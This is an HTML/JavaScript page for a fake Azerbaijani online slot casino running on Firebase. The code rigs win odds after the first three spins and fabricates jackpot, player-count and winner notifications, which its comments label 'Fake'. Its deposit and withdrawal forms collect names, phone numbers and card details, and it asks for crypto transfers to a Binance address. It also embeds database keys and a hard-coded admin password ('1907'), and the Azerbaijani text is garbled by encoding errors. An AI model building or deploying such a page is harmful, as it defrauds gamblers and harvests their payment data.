<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELCAN CASINO - ULTIMATE EMPIRE v3</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap" rel="stylesheet">
    <style>
        :root { --neon-blue: #00f2ff; --neon-purple: #bc13fe; --gold: #ffd700; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Orbitron', sans-serif; margin: 0; overflow-x: hidden; text-align: center; }
        
        /* Pul YaÄŸÄ±ÅŸÄ± Fonu */
        #money-canvas { position: fixed; inset: 0; z-index: -1; pointer-events: none; opacity: 0.5; }

        .app-container { max-width: 450px; margin: 10px auto; padding: 15px; border: 3px solid var(--neon-purple); border-radius: 30px; box-shadow: 0 0 20px var(--neon-purple); background: rgba(10, 10, 10, 0.95); }
        
        /* 4 Ã‡arxlÄ± Slot */
        .slot-box { display: flex; gap: 10px; justify-content: center; margin: 20px 0; background: #000; padding: 15px; border-radius: 20px; border: 2px solid var(--neon-blue); }
        .reel { width: 75px; height: 100px; background: #1a1a1a; border: 1px solid #333; font-size: 45px; display: flex; align-items: center; justify-content: center; border-radius: 12px; transition: 0.1s; }

        .btn { width: 100%; padding: 15px; margin: 8px 0; border: none; border-radius: 50px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-spin { background: linear-gradient(to bottom, var(--gold), #b8860b); color: #000; font-size: 18px; }
        
        /* CanlÄ± Lenta (0.5x SÃ¼rÉ™t) */
        .ticker-wrap { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.85); overflow: hidden; height: 35px; border-top: 1px solid var(--neon-blue); z-index: 100; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 80s linear infinite; color: var(--neon-blue); font-size: 13px; line-height: 35px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* Modallar */
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; display: none; }
        input { width: 85%; padding: 14px; margin: 10px; border-radius: 12px; border: 1px solid var(--neon-blue); background: #000; color: #fff; text-align: center; font-family: 'Orbitron'; }

        /* Admin Panel */
        #admin-panel { overflow-y:auto; text-align: left; background: #0a0a0a; border: 4px solid red; }
        .admin-item { border-bottom: 1px solid #333; padding: 10px; font-size: 12px; }
        .admin-btn { padding: 5px 10px; background: green; color: white; border: none; border-radius: 5px; cursor: pointer; }

        /* Fake Notifications */
        #fake-notify { position: fixed; top: 20px; right: -300px; background: var(--neon-blue); color: #000; padding: 10px 20px; border-radius: 10px; font-weight: bold; transition: 1s; z-index: 3000; font-size: 12px; }
    </style>
</head>
<body>

<canvas id="money-canvas"></canvas>
<div id="fake-notify"></div>

<div id="entry-wheel-modal" class="modal" style="display: flex;">
    <h2 style="color:var(--gold)">GÄ°RÄ°Å BONUSU!</h2>
    <div id="wheel-visual" style="width:200px; height:200px; border-radius:50%; border:5px solid var(--gold); display:flex; align-items:center; justify-content:center; font-size:40px; margin:20px 0; transition: 4s cubic-bezier(0.1, 0, 0.1, 1);">ğŸ¡</div>
    <button class="btn btn-spin" onclick="spinEntryWheel()">BONUS ÃœÃ‡ÃœN FIRLAT</button>
</div>

<div id="reg-modal" class="modal">
    <h2 style="color:var(--neon-blue)">QEYDÄ°YYAT</h2>
    <input type="text" id="reg-name" placeholder="Ad Soyad">
    <input type="tel" id="reg-phone" placeholder="Telefon (050...)">
    <button class="btn btn-spin" onclick="completeRegistration()">BAÅLA (+5 AZN HÆDÄ°YYÆ)</button>
</div>

<div id="admin-panel" class="modal">
    <h2 style="color:red; text-align: center;">ğŸš¨ Ä°MPERATOR PANELÄ° ğŸš¨</h2>
    <div id="admin-content" style="width:100%; max-height: 70vh; overflow-y: auto;"></div>
    <button class="btn" style="background:gray" onclick="closeAdmin()">BAÄLA</button>
</div>

<div class="app-container">
    <div style="display:flex; justify-content:space-between; font-size:11px; color:var(--gold);">
        <span>JACKPOT: <span id="jp-val">45,892.45</span> AZN</span>
        <span>ONLAYN: <span id="online-val">5068</span></span>
    </div>

    <div style="margin:10px 0;">
        <div style="font-size:12px; color:var(--neon-blue)">XOÅ GÆLDÄ°N, <span id="u-display">MÃ¼ÅŸtÉ™ri</span></div>
        <div style="font-size:25px; font-weight:900;">BALANS: <span id="bal-val">0.00</span> AZN</div>
    </div>

    <div class="slot-box">
        <div id="r1" class="reel">ğŸ</div>
        <div id="r2" class="reel">ğŸ</div>
        <div id="r3" class="reel">ğŸ</div>
        <div id="r4" class="reel">ğŸ</div>
    </div>

    <button class="btn btn-spin" onclick="spinSlot()">FIRLAT (1 - 500 AZN)</button>

    <div style="display:flex; gap:5px;">
        <button class="btn" style="background:#000; color:#fff; border:1px solid #ff0050; font-size:10px;" onclick="window.open('https://www.tiktok.com/@elcan.alzade3')">TIKTOK (Ã‡EK AT)</button>
        <button class="btn" style="background:#f3ba2f; color:#000; font-size:10px;" onclick="copyBinance()">BINANCE (KOPYALA)</button>
    </div>
    
    <div style="display:flex; gap:5px;">
        <button class="btn" style="background:#28a745; color:#fff; font-size:10px;" onclick="showDeposit()">PUL YÃœKLÆ (KART)</button>
        <button class="btn" style="background:#fff; color:#000; font-size:10px;" onclick="showWithdraw()">PUL Ã‡IXAR (MÄ°N 30)</button>
    </div>

    <div onclick="openAdmin()" style="cursor:pointer; font-size:20px; margin-top:10px;">ğŸš¨</div>
</div>

<div class="ticker-wrap"><div class="ticker" id="win-ticker"></div></div>

<div id="dep-modal" class="modal">
    <h3>PUL YÃœKLÆ</h3>
    <input type="number" id="dep-amount" placeholder="MÉ™blÉ™ÄŸ (AZN)">
    <input type="text" id="dep-card" placeholder="Kart NÃ¶mrÉ™niz">
    <button class="btn btn-spin" onclick="processDeposit()">YÃœKLÆ</button>
    <button class="btn" onclick="this.parentElement.style.display='none'">Ä°PTAL</button>
</div>

<div id="wit-modal" class="modal">
    <h3>PUL Ã‡IXARIÅI</h3>
    <input type="number" id="wit-amount" placeholder="MÉ™blÉ™ÄŸ (Min 30)">
    <input type="text" id="wit-card" placeholder="Kart/Hesab MÉ™lumatÄ±">
    <button class="btn btn-spin" onclick="processWithdraw()">Ã‡IXARIÅ ET</button>
    <button class="btn" onclick="this.parentElement.style.display='none'">Ä°PTAL</button>
</div>

<audio id="snd-spin" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3"></audio>
<audio id="snd-win" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>

<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

<script>
    // Firebase Beyin Kodu
    const firebaseConfig = {
      apiKey: "AIzaSyBKGAVyVRnkTLgcv8c1D3G_HRwA8GwgcmQ",
      authDomain: "royal-legend-pro-574d5.firebaseapp.com",
      databaseURL: "https://royal-legend-pro-574d5-default-rtdb.firebaseio.com",
      projectId: "royal-legend-pro-574d5",
      storageBucket: "royal-legend-pro-574d5.firebasestorage.app",
      messagingSenderId: "696766803882",
      appId: "1:696766803882:web:859289afc952838c58c5d3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let user = null;
    const items = ["ğŸ’", "ğŸ‹", "ğŸ", "7ï¸âƒ£", "ğŸ’", "ğŸ‡", "ğŸ‰"];

    // 1. Bonus Ã‡arxÄ±
    function spinEntryWheel() {
        let w = document.getElementById('wheel-visual');
        w.style.transform = "rotate(3600deg)";
        setTimeout(() => {
            alert("TÉ™briklÉ™r! 2 AZN Bonus qazandÄ±n!");
            document.getElementById('entry-wheel-modal').style.display = 'none';
            document.getElementById('reg-modal').style.display = 'flex';
        }, 4000);
    }

    // 2. Qeydiyyat
    function completeRegistration() {
        let name = document.getElementById('reg-name').value;
        let phone = document.getElementById('reg-phone').value;
        if(!name || !phone) return alert("MÉ™lumatlarÄ± doldurun!");

        db.ref('users/' + phone).once('value', s => {
            if(s.exists()) {
                user = s.val();
            } else {
                user = { name: name, phone: phone, balance: 7.0, spins: 0, ref: phone };
                db.ref('users/' + phone).set(user);
            }
            document.getElementById('reg-modal').style.display = 'none';
            startSystem();
        });
    }

    function startSystem() {
        document.getElementById('u-display').innerText = user.name;
        updateUI();
        startJP();
        fakeStats();
        loadTicker();
        setInterval(fakeNotify, 10000);
    }

    function updateUI() {
        document.getElementById('bal-val').innerText = user.balance.toFixed(2);
    }

    // 4 Ã‡arxlÄ± Slot + Alqoritm
    function spinSlot() {
        let bet = prompt("MÉ™rc mÉ™blÉ™ÄŸi (1-500 AZN):", "10");
        bet = parseFloat(bet);
        if(isNaN(bet) || bet < 1 || bet > 500) return alert("DÃ¼zgÃ¼n mÉ™rc yazÄ±n!");
        if(user.balance < bet) return alert("Balans yetÉ™rli deyil!");

        user.balance -= bet;
        user.spins++;
        updateUI();
        document.getElementById('snd-spin').play();

        let count = 0;
        let iv = setInterval(() => {
            for(let i=1; i<=4; i++) document.getElementById('r'+i).innerText = items[Math.floor(Math.random()*items.length)];
            count++;
            if(count > 20) {
                clearInterval(iv);
                // Åans: Ä°lk 3 spin 80%, sonra 20%
                let chance = user.spins <= 3 ? 0.8 : 0.2;
                if(Math.random() < chance) {
                    let winSym = items[Math.floor(Math.random()*items.length)];
                    for(let i=1; i<=4; i++) document.getElementById('r'+i).innerText = winSym;
                    user.balance += bet * 4;
                    document.getElementById('snd-win').play();
                    alert("CONGRATULATIONS! ğŸ‰");
                }
                db.ref('users/' + user.phone).update(user);
                updateUI();
                // AdminÉ™ bildiriÅŸ
                db.ref('logs').push({ name: user.name, bet: bet, balance: user.balance, time: new Date().toLocaleTimeString() });
            }
        }, 100);
    }

    // Admin Panel (ğŸš¨)
    function openAdmin() {
        if(prompt("ÅifrÉ™:") === "1907") {
            document.getElementById('admin-panel').style.display = 'flex';
            loadAdmin();
        }
    }
    function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }

    function loadAdmin() {
        db.ref('users').on('value', s => {
            let data = s.val();
            let html = "<h3>Ä°stifadÉ™Ã§ilÉ™r</h3>";
            for(let id in data) {
                html += `<div class="admin-item">
                    <b>${data[id].name}</b> (${id}) <br> Balans: ${data[id].balance} AZN 
                    <button class="admin-btn" onclick="addBal('${id}')">PUL ARTIR</button>
                </div>`;
            }
            // Ã‡Ä±xarÄ±ÅŸlar vÉ™ DepozitlÉ™r
            db.ref('requests').once('value', r => {
                let reqs = r.val();
                html += "<h3>TÉ™lÉ™blÉ™r (Depozit/Ã‡Ä±xarÄ±ÅŸ)</h3>";
                for(let k in reqs) {
                    html += `<div class="admin-item" style="background:#222">
                        ${reqs[k].type}: ${reqs[k].amount} AZN <br> User: ${reqs[k].name} (${reqs[k].phone}) <br> Kart: ${reqs[k].card}
                        <button onclick="db.ref('requests/${k}').remove()">SÄ°L</button>
                    </div>`;
                }
                document.getElementById('admin-content').innerHTML = html;
            });
        });
    }

    function addBal(phone) {
        let amt = parseFloat(prompt("NÉ™ qÉ™dÉ™r artÄ±rÄ±lsÄ±n?"));
        if(amt) db.ref('users/'+phone+'/balance').transaction(b => b + amt);
    }

    // MaliyyÉ™
    function copyBinance() {
        navigator.clipboard.writeText("TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ");
        alert("Binance TRC20 ÃœnvanÄ± KopyalandÄ±!");
    }

    function showDeposit() { document.getElementById('dep-modal').style.display = 'flex'; }
    function processDeposit() {
        let a = document.getElementById('dep-amount').value;
        let c = document.getElementById('dep-card').value;
        db.ref('requests').push({ type: "DEPOZÄ°T", name: user.name, phone: user.phone, amount: a, card: c });
        alert("Depozit sorÄŸusu adminÉ™ gÃ¶ndÉ™rildi. TikTok-dan Ã§ek atmaÄŸÄ± unutmayÄ±n!");
        document.getElementById('dep-modal').style.display = 'none';
    }

    function showWithdraw() { document.getElementById('wit-modal').style.display = 'flex'; }
    function processWithdraw() {
        let a = document.getElementById('wit-amount').value;
        if(a < 30) return alert("Minimum 30 AZN!");
        let c = document.getElementById('wit-card').value;
        db.ref('requests').push({ type: "Ã‡IXARIÅ", name: user.name, phone: user.phone, amount: a, card: c });
        alert("Ã‡Ä±xarÄ±ÅŸ sorÄŸusu qÉ™bul edildi. 24 saat É™rzindÉ™ yÃ¼klÉ™nÉ™cÉ™k.");
        document.getElementById('wit-modal').style.display = 'none';
    }

    // Fake EffektlÉ™r
    function startJP() { setInterval(() => { document.getElementById('jp-val').innerText = (parseFloat(document.getElementById('jp-val').innerText) + 0.05).toFixed(2); }, 2000); }
    function fakeStats() { setInterval(() => { document.getElementById('online-val').innerText = 5000 + Math.floor(Math.random()*100); }, 4000); }
    function loadTicker() {
        let t = "";
        for(let i=0; i<40; i++) t += ` â€¢ Ä°stifadÉ™Ã§i 0${Math.floor(Math.random()*99)}*** uddu: ${Math.floor(Math.random()*1000)} AZN | `;
        document.getElementById('win-ticker').innerText = t;
    }
    function fakeNotify() {
        let n = document.getElementById('fake-notify');
        n.innerText = "Ä°stifadÉ™Ã§i " + Math.floor(Math.random()*99) + " indicÉ™ " + Math.floor(Math.random()*200) + " AZN uddu!";
        n.style.right = "20px";
        setTimeout(() => n.style.right = "-300px", 4000);
    }

    // Pul YaÄŸÄ±ÅŸÄ±
    const canvas = document.getElementById('money-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    let coins = [];
    function draw() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        ctx.fillStyle = "gold";
        if(coins.length < 40) coins.push({x:Math.random()*canvas.width, y:0, s:Math.random()*3+1});
        coins.forEach((c,i) => { ctx.fillText("$", c.x, c.y); c.y += c.s; if(c.y > canvas.height) coins.splice(i,1); });
        requestAnimationFrame(draw);
    }
    draw();
</script>

</body>
</html>
